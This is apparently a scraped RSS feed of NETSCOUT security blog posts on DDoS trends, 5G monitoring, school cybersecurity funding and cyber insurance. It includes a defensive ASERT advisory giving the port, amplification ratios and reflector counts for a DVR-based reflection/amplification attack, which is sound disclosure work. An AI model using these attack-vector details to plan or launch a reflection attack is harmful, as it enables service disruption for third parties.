<p>The RAN intelligence controller (RIC) poses further challenges for <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="2b6c82f1-d16a-47cc-b3c1-8c4894359930" href="http://localhost:7996/demo/5g-radio-access" title="5G Radio Access">RAN</a> operations. At present, the RIC has only high-level insights within a (radio resource) connection and does not have the ability to understand the connections between the same subscriber or other user equipments (UE). With no IMSI/IMEI correlation across connections (for both specific and multiple UEs), there is increased risk for false positive alarms/actions. For example, if a handset type causes many problems in a few cells, the RIC may not be able to understand and isolate that specific device issue and instead may falsely identify a systemic network issue.</p>

<p>Finally, the vendor RU/DU/CU mix and match poses potential interoperation issues as vendors deviate from standards to differentiate themselves. How do the various integrated components work together in live network operation?</p>

<p><strong>Integration, Deployment, and Operational Risk</strong></p>

<p>The 5G race is on, with much commercial pressure to launch. But with an integrated cloud RAN, mobile operators should anticipate unexpected issues that will increase time to market, as well as unexpected network performance degradation. Having cloud-optimized instrumentation to gain visibility will give operations teams the ability to proactively monitor and optimize 5G New Radio (NR) performance. With an explosion of cells (five to ten times more than with <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="d0af380f-adf6-4296-915b-90fad7a01b9e" href="http://localhost:7996/what-is/2g-3g-4g" title="What is 2G, 3G, 4G?">4G</a>) expected in O-RAN, propagation modeling for 5G NR design and operational automation will be needed to reduce costs. Smart data is needed to verify orchestration, because typical AI input/learning often leads to output errors with no way to understand the decision path.</p>

<p>Complexity bests summarizes the challenge of the new multivendor cloud-based implementation of 5G O-RAN. Having complete visibility for operation, orchestration, analytics, and security throughout the 5G lifecycle is critical to 5G success and will enable mobile operators to realize the vision of 5G for a lower-cost, agile, multivendor, cloud-based RAN.</p>

  <title>The Power of ISP Collaboration for DDoS Mitigation </title>
  <link>http://localhost:7996/blog/ddos-mitigation-collaboration</link>
  <description>The power of ISP collaboration for DDoS mitigation—three ways ISPs can assist customers and improve mitigation efforts.</description>
  <content:encoded><![CDATA[<p>For the first time in history, the annual number of observed <a href="https://www.netscout.com/what-is-ddos">distributed denial-of-service (DDoS)</a> attacks in 2020 crossed the 10 million attack threshold, with NETSCOUT’s ATLAS Security Engineering and Response Team (ASERT) seeing <a href="https://www.netscout.com/threatreport">10,089,687 attacks</a> over the course of the year. Unfortunately, that activity has <a href="https://www.netscout.com/blog/asert/beat-goes">surged into 2021</a>, with threat actors launching approximately&nbsp;2.9 million DDoS attacks in the first quarter of 2021 alone—a 31 percent increase from the same time in 2020.&nbsp;</p>

<p>These attacks have changed the way ISPs think about DDoS mitigation. Rather than going it alone, they can use their position close to the source of the attacks to build collaborative networks with other ISPs, both upstream and downstream. By leveraging their ability to see malicious traffic early, ISPs can use such initiatives to assist customers and improve mitigation efforts.</p>

<p><strong>It Takes an Industry</strong></p>

<p>Ideally, such collaboration should extend beyond ISPs to include other stakeholders, but the industry has to climb aboard the collaboration train first—and as previous efforts show, some are reluctant to do so.</p>

<p>Plans such as the Internet Engineering Task Force’s (IETF) DDoS Open Threat Signaling (DOTS) program attempted to develop a collaboration initiative. The aim of DOTS was to develop a standards-based approach for the real-time signaling of DDoS-related telemetry and threat-handling requests and data between elements concerned with DDoS attack detection, classification, traceback, and mitigation.</p>

<p>But programs such as these required companies to install provisioned infrastructure or share attack data to a central database, which was an issue. The perceived risk of sharing system data with other companies or storing it in the cloud caused many organizations to balk at these requirements.</p>

<p>But that reluctance—often at the senior executive level—doesn’t mean these initiatives lack value. Indeed, the industry as a whole can make significant strides in DDoS protection if stakeholders can coordinate DDoS protection across the spectrum.</p>

<p>This collaboration falls into three categories: ISP-to-ISP collaboration, customer-to-ISP collaboration, and threat intelligence sharing.</p>

<p><strong>ISP to ISP </strong></p>

<p>Attack collaboration among ISPs requires a fully integrated inter-network signaling mechanism that allows network operators to share attack attributes and coordinate defenses spanning network boundaries to collectively stop DDoS attacks nearer to their source. For example, one ISP (ISP A) may see DDoS traffic that is attacking its network customers but that originates or passes through an upstream ISP (ISP B). ISP A could then alert ISP B that the identified attack traffic is coming through ISP B’s network, while also providing attack details and potentially attack countermeasures.</p>

<p><strong>Customer to ISP</strong></p>

<p>Customer-to-ISP collaboration works via an on-premises solution that can share attack attributes with upstream ISPs. The upstream providers can use the identified attack attributes to create countermeasures within their systems and further share those countermeasures with their peers and other customers.</p>

<p><strong>Sharing Threat Intelligence</strong></p>

<p>To help support the DDoS defense community as a whole, stakeholders can use a system to curate and send anonymous attack statistics to other players in the community, providing information about observed DDoS attacks and other forms of observed cyber threat activity.</p>

<p>As the global DDoS threat landscape grows and attacks become more frequent and complex, worldwide network operators, their peers, and their customers must adapt to successfully identify and mitigate these new attacks. Collaboration across a wide swathe of internet entities looking for protection is a big step forward.</p>

  <title>United Arab Emirates Under Attack</title>
  <link>http://localhost:7996/blog/uae-under-attack</link>
  <description>A year in review: Detailed DDoS attack data for United Arab Emirates</description>
  <content:encoded><![CDATA[<p>We saw record-breaking numbers of distributed denial-of-service (DDoS) attacks in 2020, and the COVID-19 pandemic was the clear catalyst. Attackers widened their target profile beyond usual-suspect industries as the massive shift to online work and play opened promising new avenues of attack. And as the world leaned even more heavily on pandemic-era mainstays such online streaming, ecommerce, cloud, and online learning, attackers naturally followed.</p>

<p>While that unprecedented activity was widely reflected worldwide, it’s also useful to narrow the lens to see variations in impact at a more granular level. Our weekly series focuses on DDoS activity in specific countries. This week: <a href="https://www.netscout.com/threatreport/emea/united-arab-emirates/">United Arab Emirates</a><a href="https://www.netscout.com/sites/default/files/2021-04/SECR_040_EN-2101-TR2H2020_EMEA_United%20Arab%20Emirates.pdf">.</a></p>

  <title>Educational Services Are Under Cyberattack. Here’s How to Get Help</title>
  <link>http://localhost:7996/blog/help-for-educators-against-cyberattacks</link>
  <description>The widespread implementation of distance learning in response to COVID-19 has sparked a widespread increase in DDoS and ransomware attacks on educational institutions. Here’s how to protect yourself.</description>
  <content:encoded><![CDATA[<p><em>Authored by Mike Wetherbee&nbsp;and Carol Hildebrand</em></p>

<p>As&nbsp;academic institutions&nbsp;plan the return to full-time classroom learning this fall, they must not lose sight of 2020’s spike in cyberattacks on educational services. As online learning triggered network expansion, cybercriminals quickly took advantage of the increased threat surface to launch a barrage of attacks on educational services.</p>

<p>This activity was seen not only at colleges and universities but also at the high school and middle school level. As the world leaned even more heavily on pandemic-era online learning, attackers naturally followed, and it looks as if the trend&nbsp;will continue. NETSCOUT data shows that attackers launched nearly 80 million assaults targeting educational institutions in the first half of 2021.</p>

<p>To make matters worse, attackers are not only increasing attack frequency but also are launching smaller, more complex attacks that are harder to detect.&nbsp;An attacker often will run multiple attack types in hard-to-predict patterns, which makes them even trickier to detect and defend against.</p>

<p>So how can schools combat these increased threats? They need to know what threats they are facing, what technology to invest in, and how to pay for it.</p>

<p><strong>What threats are schools facing?</strong> Cybercriminals are taking advantage of the new threat surface&nbsp;outside of the core network&nbsp;created by online learning. These endpoints typically are connected to the network via virtual private network (VPN) or online SaaS-based services. Because of this, firewalls and VPNs increasingly are under the gun, reflecting the shift in student and teacher access driven by online learning. Furthermore, attackers now tend to launch smaller attacks to avoid being detected by volumetric alerts in cloud scrubbing centers. NETSCOUT data shows that only about 7 percent of all attacks clocked in above 1 Gbps during the first six months of 2021.&nbsp;</p>

<p><strong>What technology should they invest in?</strong>&nbsp;Because of the size and type of distributed denial-of-service (DDoS) attacks that an educational institution may encounter, combined with the complexity of each institution’s network, schools may well need to implement a variety of mitigation strategies and security postures. However, a smart first step is to invest in on-premises protection. This is a key shift for many schools, particularly K-12 organizations, because many did not make attractive targets in the past. Today, with the newly increased threat surface, it really comes down to when an attack will hit, not if it will happen.&nbsp;</p>

<p>On-premises protection is needed because attackers now are able to launch attacks that slip by upstream protection. Application-layer attacks, smaller attacks, Transmission Control Protocol (TCP) floods, and attacks aimed at VPNs and firewalls all are designed to avoid triggering volumetric alerts. The threat to educational institutions&nbsp;is further amplified by the potential for compromised hosts within the network, ready to communicate with known command-and-control (C2C) infrastructures on the internet for further exploitation&nbsp;via&nbsp;malware.&nbsp;</p>

<p>Industry experts agree that a&nbsp;multilayered&nbsp;DDoS&nbsp;defense strategy is the best overall mitigation approach. For education institutions in the current landscape, that means first protecting the network at the edge before augmenting that effort with additional layers of security outward.</p>

<p><strong>How can they pay? </strong>The United States federal government offers several emergency-relief mechanisms that include funding for cybersecurity technology, including:</p>

<ul>
	<li>The Coronavirus Aid, Relief, and Economic Security (CARES) Act established the Education Stabilization Fund (ESF), which allocated $30.75 billion to the U.S. Department of Education.</li>
	<li>The ESF is composed of three primary emergency relief funds: the Governor’s Emergency Education Relief Fund (GEERF), the Elementary and Secondary School Emergency Relief (ESSER) fund, and the Higher Education Emergency Relief Fund (HEERF).</li>
	<li>Furthermore, the Coronavirus Response and Relief Supplemental Appropriations Act (CRRSAA) provides an additional $81.9 billion to the ESF.</li>
	<li>And finally, the U.S. Department of Education received more than $170 billion in new resources through the American Rescue Plan (ARP) to support ongoing state and institutional COVID-19 recovery efforts.</li>
</ul>

<p>Although there was some initial confusion about whether these funds could be used for cybersecurity investments, a recent <a href="https://oese.ed.gov/files/2021/05/ESSER.GEER_.FAQs_5.26.21_745AM_FINALb0cd6833f6f46e03ba2d97d30aff953260028045f9ef3b18ea602db4b32b1d99.pdf">FAQ from the Department of Education</a> offered confirmation, stating that “if a school, LEA, or State is improving cybersecurity to better meet educational and other needs of students related to preventing, preparing for, or responding to COVID-19, it may use ESSER or GEER funds.”</p>

<p>However, schools need to be aware that many of the funding programs require the awards to be allocated to the school systems by a set time. Once allocated to the educational institutions, the ESSER and GEERF programs have specified time frames for spending the money, whereas the HEERF program requires awards to be spent within a year of receipt.</p>

<p>Educational institutions at all levels will have to come to terms with DDoS and cyberattacks in a post-pandemic world that may never return to its former level of in-person learning. And even if it does return, increased reliance on cloud-based technology, applications, and services in the classroom and at home will make education a higher-value target&nbsp;for&nbsp;attacks. Fortunately, there are powerful solutions to help educational organizations protect their vital applications and services. But to take advantage of the available federal funding for cybersecurity investments, the time to act is now.</p>

  <title>The High Cost of Cybercrime Is Getting Higher</title>
  <link>http://localhost:7996/blog/high-cost-cybercrime-getting-higher</link>
  <description>If cybercrime organizations could be publicly traded, we’d have an instant new multibillion dollar industry sector. Indeed, cyberthreats have become so pervasive that U.S. President Joe Biden recently signed an executive order aimed at improving federal cybersecurity in the wake of multiple significant cyberattacks, including the ransomware attack that shut down the Colonial...</description>
  <content:encoded><![CDATA[<p>If cybercrime organizations could be publicly traded, we’d have an instant new multibillion dollar industry sector. Indeed, cyberthreats have become so pervasive that U.S. President Joe Biden recently signed an <a href="https://www.whitehouse.gov/briefing-room/statements-releases/2021/05/12/fact-sheet-president-signs-executive-order-charting-new-course-to-improve-the-nations-cybersecurity-and-protect-federal-government-networks/">executive order</a> aimed at improving federal cybersecurity in the wake of multiple significant cyberattacks, including the ransomware attack that shut down the Colonial Pipeline.</p>

<p>Meanwhile, a broad coalition of experts in industry, government, law enforcement, civil society, and international organizations have joined together in the <a href="https://securityandtechnology.org/ransomwaretaskforce/">Ransomware Task Force</a> to build a framework for combatting ransomware.</p>

<p>Ransomware attacks are only one method, however. Threat actors also use distributed denial-of-service (DDoS) attacks to ratchet up the pressure. For example, with <a href="https://www.netscout.com/blog/what-ddos-extortion-attack">DDoS extortion</a> (aka ransom DDoS) attacks, cybercriminals threaten individuals or organizations with a DDoS incursion unless an extortion demand is paid. The threat actors behind last year’s Lazarus Bear Armada (LBA) DDoS extortion campaign used a variety of vectors and methods to target thousands of companies across a range of industries. Not surprisingly, data from NETSCOUT’s 16th annual <a href="https://www.netscout.com/threatreport">Worldwide Infrastructure Security Report</a> (WISR) shows that DDoS extortion attacks grew by an astounding 125 percent in 2020.</p>

<p>Then there are <a href="https://www.netscout.com/blog/triple-extortion-tactics-rise-ransomware-gangs">triple extortion attacks</a>, which combine file encryption, data theft, and DDoS attacks to create even more trouble. Ransomware gangs SunCrypt and Ragnar Locker were early users of this tactic, and we now see it deployed via well-organized business models that include ransomware-as-a-service offerings, affiliations, and support centers.</p>

<p>Paying the ransom is tempting for many victims of these attacks, if for no other reason than to try to curtail the damage done by an extended shutdown. And it’s one reason by cyber insurance has become an increasingly popular choice for companies looking to cover potential losses from a cyberattack. A recent <a href="https://www.cnn.com/2021/06/05/tech/ransomware-cyber-insurance-what-to-do/index.html">CNN</a> story reported that AIG, one of the world's largest insurers, “saw a 150 percent increase in ransom and extortion claims between 2018 and 2020. Ransom demands now account for one in every five cyber insurance claims, the company added.”</p>

<p><strong>Cyber Insurance Premiums Skyrocket</strong></p>

<p>However, as more attacks occur, the cost of this type of insurance is skyrocketing. According to an April <a href="https://www.fitchratings.com/research/insurance/cyber-insurance-losses-spark-rate-increases-26-05-2021">report</a> from Fitch Ratings, premiums for cyber insurance coverage have increased 22 percent over the previous year and are expected to continue going up for the foreseeable future.</p>

<p>Skyrocketing premiums are not the only reason that cyber insurance is not a panacea. The U.S. Department of Justice has <a href="https://www.cnn.com/2021/06/03/politics/doj-ransomware/index.html">announced</a> plans to use the same protocols on anti-ransomware efforts as it does for terrorism. As a result, insurance providers will be able to avoid making cyber insurance payouts if an attack is deemed an act of terrorism, because terrorism insurance typically is a separate policy.</p>

<p><strong>Investing in Security Is Key</strong></p>

<p>As the cost and complexity of cyber insurance increase, it’s clear that simply insuring against cyberattacks is insufficient. In fact, a <a href="https://insuranceblog.accenture.com/five-predictions-for-cyberinsurance-in-2021">recent report from Accenture</a> found that as the cyber insurance market hardens, underwriters have a host of data available for winnowing out the high-risk companies that don’t practice good cyber hygiene. These insurers increasingly will reward companies that can demonstrate robust cybersecurity best practices, such as the following:</p>

<ul>
	<li><strong>Avoid the network breach. </strong>Best practices include educating users on proper cybersecurity hygiene and employing network and endpoint cybersecurity protection solutions to detect malware, anomalous activity, or indicators of compromise (IoCs).</li>
	<li><strong>Pay attention to the basics. </strong>Back up valuable data and test data-restoration plans. Run vulnerability assessments and patch and update computer systems accordingly to avoid compromise.</li>
	<li><strong>Deploy continuous threat intelligence.</strong> Staying abreast of the latest threat intelligence helps companies detect, investigate, or proactively hunt for IoCs that could precede a ransomware attack.</li>
	<li><strong>Use proper DDoS protection. </strong>DDoS attacks are increasing in size, frequency, and complexity. Best practices in DDoS mitigation include a hybrid, intelligent combination of cloud-based and on-premises DDoS mitigation.</li>
</ul>

<p>Battling cybercrime is a multifront war, and modern-day DDoS attacks are complex, multivector, and dynamic. Companies need to make ongoing investments in security to adapt to constantly evolving threat tactics. The more robust a defense is, the more capable a company will be in fending off the growing number of cyberthreats.</p>

  <title>Public Schools Look to Federal Funding to Offset COVID-19 Spending</title>
  <link>http://localhost:7996/blog/federal-funding-school-technology</link>
  <description>As remote learning strains educational tech systems nationwide, U.S. public school districts are using CARES Act dollars to improve the quality of digital services for students and teachers.</description>
  <content:encoded><![CDATA[<p>As the COVID-19 pandemic <a href="https://www.netscout.com/blog/threat-actors-target-remote-learning-during-covid-19">upended educational systems</a> around the world, the massive shift to remote education triggered significant technology-related challenges. Supporting remote learning for students strained the digital technology environments at many schools, leading to the need for increased tech investments, particularly in the public K-12 schools.</p>

<p>Students needed devices such as laptops and tablets, but that was just the start. They also needed cameras, headsets, speakers, and microphones to participate in online classes, as well as Wi-Fi hot spots—both in schools and in student homes—for connecting to the internet. Schools also often had to purchase additional computer software licenses for learning management software as well as communications and collaboration applications.</p>

<p>Early into remote learning, many school districts had to add capacity and bandwidth for internet access to support the added volume of traffic needed to facilitate remote and hybrid classes, as well as to access vital cloud-based remote-learning applications such as Google Meet, Google Docs, and Zoom.</p>

<p>For the U.S. in most cases, federal stimulus programs such as the CARES Act provided funding or reimbursement for these technology purchases. Approved by Congress in 2020, this legislation helped schools make the technology investments they need to bring the classroom to the students during the COVID-19 pandemic.</p>

<p><strong>Investing in Service Quality and Security</strong></p>

<p>IT teams supporting school systems inevitably faced challenges maintaining performance quality for students—both at home and in school—as well as for many of the teachers. Problems included the following:</p>

<ul><li>Poor quality or delayed audio and/or video with communication and collaboration tools</li>
	<li>Inability to log into the schools’ learning management applications</li>
	<li>Internet and broadband bottlenecks at schools and data centers</li>
</ul><p>Schools also had to grapple with cybersecurity threats to consistent, reliable remote learning during this period. Headline-grabbing disruptions were reported for school districts in Maryland, Florida, Virginia, and Massachusetts, among others, ranging from students launching <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="4dbce3cf-7733-47a9-96be-6afc3fa09c28" href="http://localhost:7996/what-is-ddos" title="What Is a Distributed Denial of Service (DDoS) Attack?">distributed denial-of-service (DDoS) attacks</a> against their schools to threat actors that held a school’s network for ransom. With the institutions’ networks unavailable for days, both in-person and remote classes were canceled.</p>

<p>Combatting the threats to both network performance and security have led some IT organizations to source performance monitoring and management platforms as well as cybersecurity solutions. While students and faculty take a well-earned break this summer, IT professionals are hard at work evaluating their current-state situations and investigating upgrades to their schools’ performance management and security technology. The good news is that many schools should qualify, at least in part, for CARES Act monies and other education technology grants.</p>

  <title>Spain Under Attack</title>
  <link>http://localhost:7996/blog/spain-under-attack</link>
  <description>A year in review: Detailed DDoS attack data for Spain</description>
  <content:encoded><![CDATA[<p>We saw record-breaking numbers of distributed denial-of-service (DDoS) attacks in 2020, and the COVID-19 pandemic was the clear catalyst. Attackers widened their target profile beyond usual-suspect industries as the massive shift to online work and play opened promising new avenues of attack. And as the world leaned even more heavily on pandemic-era mainstays such online streaming, ecommerce, cloud, and online learning, attackers naturally followed.</p>

<p>While that unprecedented activity was widely reflected worldwide, it’s also useful to narrow the lens to see variations in impact at a more granular level. Our weekly series focuses on DDoS activity in specific countries. This week: <a href="https://www.netscout.com/sites/default/files/2021-04/SECR_038_EN-2101-TR2H2020_EMEA_Spain.pdf">Spain.</a></p>

  <title>It Takes Two to Tango</title>
  <link>http://localhost:7996/blog/it-takes-two-tango</link>
  <description>As enterprises increasingly rely on software-defined data centers and public and private cloud architecture, it’s paramount to bring network and security teams together to meet growing security challenges.</description>
  <content:encoded><![CDATA[<p>As businesses shifted their network utilization to meet the demands brought on by the COVID-19 pandemic, cybercriminals jumped at the opportunity to exploit new vulnerabilities. Mass-scale migration to the cloud and a heavy reliance on remote workers opened the door to new security concerns.</p>

<p>According to a “A Guide to NetOps and SecOps Collaboration,” a recent white paper from Enterprise Management Associates (EMA), 35 percent of network operations teams say security system problems, such as bad policies and device failures, have led to complex and difficult-to-troubleshoot service performance issues. Another 35 percent reported that incidents originally presented themselves as complex service performance problems that required cross-silo collaboration.</p>

<p>Amidst growing enterprise adoption of software-defined data centers and public and private cloud architecture, that cross-silo collaboration is increasingly important. To meet growing security challenges, enterprise CIOs must find ways to bring network and security teams together.</p>

<p>NetSecOps collaboration is key to achieving the critical goals of improved network performance, security risk reduction, and accelerated security incident detection and response. The more converged network and security teams are, and the more integrated the tools and processes used between them, the more successful they can be at achieving the aforementioned objectives.</p>

<p><strong>4 Steps to Collaboration </strong></p>

<p>The white paper, which draws on <a href="https://www.enterprisemanagement.com/research/asset.php/3899/Network-Management-Megatrends-2020">EMA research</a> on network megatrends, lays out four areas of focus for achieving successful network and security team collaboration.</p>

<ol>
	<li><strong>Collaboration should begin at the design and deployment stage. </strong>As enterprises race to embrace the cloud, software-defined WAN solutions, virtualization, Internet of Things, and increased mobility, the security perimeter is becoming more vulnerable than ever. That is why NetSecOps collaboration should take place at the infrastructure design and deployment stage. Security has to be a first priority.</li>
</ol>

<ol start="2">
	<li><strong>Effective collaboration</strong><strong>starts with a single source of truth. </strong>A single source of truth will ensure that network and security teams are sharing consistent, up-to-date information, thus eliminating blind spots and data control conflicts. NetSecOps should look for opportunities to unify their data collection, as well as the tools used for analysis, wherever possible.</li>
</ol>

<ol start="3">
	<li><strong>Choosing the right tools is key. </strong>The EMA report found that network performance monitoring and network automation/orchestration are considered the two most essential tools for collaboration. Because network performance and security incidents often are interrelated, performance management tools are essential for identifying potential security incidents. This information can enable analysts to see how a security incident is affecting performance. Network automation tools can be extremely helpful, because they empower enterprises to make quick changes to the network in response to a security event.</li>
</ol>

<ol start="4">
	<li><strong>Formalize the collaboration. </strong>To ensure success, enterprises should formalize collaboration between network and security teams. By documenting the processes established for collaboration, creating change controls where necessary, and leveraging industry best practices where relevant, companies can establish a roadmap to guide an effective partnership between network and security teams. In this way, organizations can derive the maximum benefit from NetSecOps.</li>

  <title>DHCPDiscover Reflection/Amplification DDoS Attack Mitigation Recommendations</title>
  <link>http://localhost:7996/blog/asert/dhcpdiscover-reflectionamplification-ddos-attack-mitigation</link>
  <description>DHCPDiscover, a UDP-based JSON protocol used to manage DVRs, can be abused to launch UDP reflection/amplification attacks when an internet-exposed DVR lacks any form of authentication.</description>
  <content:encoded><![CDATA[<h1>ASERT Threat Summary</h1>

<p><strong>Date/Time:</strong>&nbsp;7July2021 1600UTC</p>

<p><strong>Severity:</strong> Warning</p>

<p><strong>Distribution:</strong> TLP: <a href="https://www.us-cert.gov/tlp">WHITE</a>&nbsp;</p>

<p><strong>Categories:</strong> Availability</p>

<p><strong>Contributors: </strong>Jon Belanger, Chris Conrad, John Kristoff, Hardik Modi, Marco Gioanola, Andrew Cockburn, Dennis Hohmann.</p>

<h2>Executive Summary</h2>

<p>DHCPDiscover, a UDP-based JSON protocol used to manage networked digital video recorders (DVRs), can be abused to launch UDP reflection/amplification attacks when an internet-exposed DVR lacks any form of authentication for the service. Unfortunately, many of these DVR variants by default do not include such authentication. At this point, the DHCPDiscover reflection/amplification attack vector appears to have been added to the arsenals of booter/stresser DDoS-for-hire services, placing it within the reach of the general attacker population.</p>

<h2>Key Findings:&nbsp;</h2>

<ul>
	<li>For organizations with vulnerable DVRs that are abused as reflectors/amplifiers, the collateral damage could be significant. Video recording applications could be partially or fully halted, which could impact applications such as security cameras.</li>
	<li>Network operators must be careful not to overblock legitimate internet traffic by wholesale filtering of all UDP/37810-sourced traffic. Doing so runs the risk of internet service disruptions for downstream customers.&nbsp;</li>
	<li>Network operators should perform reconnaissance to identify and remediate abusable DHCPDiscover reflectors/amplifiers on their networks and/or the networks of their customers.&nbsp;</li>
</ul>

<h2>Description</h2>

<p>DHCPDiscover is a UDP-based JSON protocol used to manage multiple variants of networked digital video recorders (DVRs) that run firmware originally developed by a single OEM and marketed under various brands worldwide. Many of these DVR variants by default lack any form of authentication for the DHCPDiscover service and will reply to crafted packets destined for the relevant UDP port on relevant devices.</p>

<p class="text-align-center"><em><strong>IMPORTANT:</strong> It should be noted that the somewhat confusingly named DHCPDiscover JSON management protocol referenced in this Threat Summary is wholly unrelated to DHCPDISCOVER messages that are a routine part of the Dynamic Host Configuration Protocol (DHCP) network address allocation mechanism described in RFC2131.</em><br />
&nbsp;<em>The contents of this Threat Summary are in no way related to DHCP nor to IP address allocation practices in general.</em></p>

<p>When these devices are exposed to the public internet—typically via static NAT mapping—the DHCPDiscover service may be abused to launch UDP reflection/amplification attacks with an amplification ratio of ~23.15:1–25.68:1. The amplified attack traffic consists of non-fragmented UDP packets sourced from UDP/37810 and directed towards the destination IP address(es) and UDP port(s) of the attacker’s choice. The amplified attack packets range from 576 bytes to 912 bytes in length. To date, 133,853 abusable DHCPDiscover reflectors/amplifiers have been identified.</p>

<p>Observed attack bandwidth (bps) sizes range up to ~63.5 Gbps for single-vector DHCPDiscover reflection/amplification attacks, and up to an aggregate ~566.88 Gbps for multivector attacks that include DHCPDiscover as a component. The highest observed throughput for a single-vector DHCPDiscover reflection/amplification attack is ~15.14 Mpps, and up to an aggregate ~69.25 Mpps for multivector attacks that include DHCPDiscover as a component.&nbsp;</p>

<p>As is routinely the case with newer DDoS attack vectors, it appears that after an initial period of employment by advanced attackers with access to bespoke DDoS attack infrastructure, DHCPDiscover reflection/amplification appears to have been weaponized and added to the arsenals of booter/stresser DDoS-for-hire services, placing it within the reach of the general attacker population.</p>

<h2>Collateral Impact</h2>

<p>The collateral impact of DHCPDiscover reflection/amplification attacks is potentially significant for organizations whose internet-exposed DVRs are abused as reflectors/amplifiers. This may include partial or full interruption of video recording applications, as well as additional service disruption due to transit capacity consumption; state-table exhaustion of NATs, stateful firewalls and load-balancers; etc.</p>

<p>Wholesale filtering of all UDP/37810-sourced traffic by network operators may potentially overblock legitimate internet traffic. &nbsp;</p>

<h2>Mitigating Factors</h2>

<p>Collateral impact to abusable DHCPDiscover reflectors/amplifiers can alert network operators and/or end-customers to remove affected DVRs from DMZ networks or IDCs, or to disable relevant UDP port-forwarding rules which forward specific UDP ports from the public internet to these devices, thereby preventing them from being abused in DHCPdiscover reflection/amplification attacks.&nbsp;<br />
&nbsp;<br />
DHCPDiscover reflection/amplification DDoS attack traffic can be mitigated via the implementation of industry-standard best current practices (BCPs) such as situationally-appropriate network access control policies, network infrastructure-based reaction mechanisms such as flowspec, and intelligent DDoS mitigation systems such as NETSCOUT Arbor Sightline/TMS and AED/APS.</p>

<h2>Recommended Actions</h2>

<p>Network operators should perform reconnaissance to identify and remediate abusable DHCPDiscover reflectors/amplifiers on their networks and/or the networks of their customers.&nbsp;</p>

<p>Organizations with business-critical public-facing internet properties should ensure that all relevant network infrastructure, architectural and operational Best Current Practices (BCPs) have been implemented, including situationally specific network access policies which only permit internet traffic via required IP protocols and ports. Internet access network traffic to/from internal organizational personnel should be deconflated from internet traffic to/from public-facing internet properties and served via separate upstream internet transit links.</p>

<p>DDoS defenses for all public-facing internet properties and supporting infrastructure should be implemented in a situationally appropriate manner, including periodic testing to ensure that any changes to organization’s servers/services/applications are incorporated into its DDoS defense plan. Organic, on-site intelligent DDoS mitigation capabilities should be combined with cloud- or transit-based upstream DDoS mitigation services in order to ensure maximal responsiveness and flexibility during an attack.</p>

<p>It is imperative that organizations operating mission-critical public-facing internet properties and/or infrastructure ensure that all servers/services/application/datastores/infrastructure elements are protected against DDoS attack, and are included in periodic, realistic tests of the organization’s DDoS mitigation plan. In many instances, we have encountered situations in which obvious elements such as public-facing web servers were adequately protected, but authoritative DNS servers, application servers, and other critical service delivery elements were neglected, thus leaving them vulnerable to attack.</p>

<p>Specifics of countermeasure selection, tuning, and deployment will vary based upon the particulars of individual networks/resources; the relevant NETSCOUT Arbor account teams and/or Arbor Technical Assistance Center (ATAC) may be consulted with regards to optimal countermeasure selection and employment.</p>

  <title>The New Challenges of Monitoring 5G Networks </title>
  <link>http://localhost:7996/blog/new-challenges-monitoring-5g</link>
  <description>5G presents enormous opportunity—along with big challenges for service providers. Learn about 5G network monitoring and performance challenges and how to solve them in a new ebook from Light Reading.</description>
  <content:encoded><![CDATA[<p><a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="9a28c40e-7f65-4841-9cc9-60c943f85f94" href="http://localhost:7996/what-is/5G" title="What is 5G?">5G</a> presents an enormous opportunity. But like most ground-breaking new technologies affecting the industry, it also increases complexity for wireless network operators, particularly when it comes to network control, management, and security. The question is, how do network operators build a 5G strategy that maximizes the benefits while minimizing the challenges and risks?</p>

<p>A new ebook from Light Reading, an independent B2B digital news, and analysis platform for the global communications networking and services industry delves into that very topic by looking at the issues network operators face as they transition from the initial non-standalone 5G framework that relied on a 4G network core to a fully 5G standalone scheme.</p>

<p>Entitled “5G Signals New Challenges with Network Monitoring and Performance,” the ebook explores some key topics, including the following: </p>

<p><strong>Next-gen network monitoring and control</strong>. Standalone 5G’s increased complexity increases the risk of network disruption from software update bugs, competition for resources among network elements, and cyberattacks launched by bad actors. In response, 5G operators are turning to network automation and open radio access network (O-RAN) platforms to improve network control and monitoring.</p>

<p><strong>The cloudification of 5G.</strong> When it comes to standalone 5G networks, many of the world’s largest mobile operators are considering moving to a cloud-native network architecture coupled with containers.</p>

<p><strong>5G security. </strong>The advent of 5G wireless communications brings with it the need for new security measures, such as the new measures being tested by Verizon.</p>

<p><strong>Cloud-native 5G core.</strong> There are many good reasons for operators to deploy a new core network and move to standalone 5G. Offering services linked to new 5G capabilities such as network slicing, edge applications, fixed/mobile convergence, and—in time—ultra-reliable low-latency communications (URLLC) is the primary motivation.</p>

<p><strong>Virtualization’s vital role in 5G. </strong>Leading service providers have embraced the concept of virtualization technologies but still run only relatively low volumes of their total network traffic over their virtual infrastructure.</p>

  <title>To Adapt or Not to Adapt? </title>
  <link>http://localhost:7996/blog/adapt-or-not-adapt</link>
  <description>A successful move to a subscription-based business model hinges on your ability to get the sales team on board.</description>
  <content:encoded><![CDATA[<p>It is no surprise that the transition from a business model based on pay-per-product to one based on subscriptions has significantly changed how many companies operate, particularly in the software industry. According to <a href="https://www.mckinsey.com/industries/technology-media-and-telecommunications/our-insights/the-next-software-disruption-how-vendors-must-adapt-to-a-new-era" target="_blank">McKinsey &amp; Company</a>, software as a service (SaaS) as a percentage of total global enterprise software revenue rose from just 6 percent in 2010 to 75 percent in 2018, totaling more than $380 billion annually.</p>

<p>The subscription-based model also has expanded to industries such as airlines, healthcare, and wellness, but in a recent Forbes article, Bruce Kelley, CTO and SVP of NETSCOUT, points out one possible sticking point: getting the sales team to adapt. After all, this group will sustain the biggest impact, and it’s up to business leaders not only to help them understand the value of the move but also to rethink training and compensation to support this new reality.</p>

<p>Read the <a href="https://www.forbes.com/sites/forbestechcouncil/2021/06/11/why-sales-teams-need-to-adapt-to-the-subscription-economy/?sh=305d41f46efa" target="_blank">full article</a> to learn more.</p>

  <title>Hackathons: Fun for the Whole Family</title>
  <link>http://localhost:7996/blog/families-that-hack-together-3</link>
  <description>NETSCOUT dads and kids pitch in on student hackathons that help build interest in IT careers across underrepresented communities.</description>
  <content:encoded><![CDATA[<p><em>Last of a three-part series</em></p>

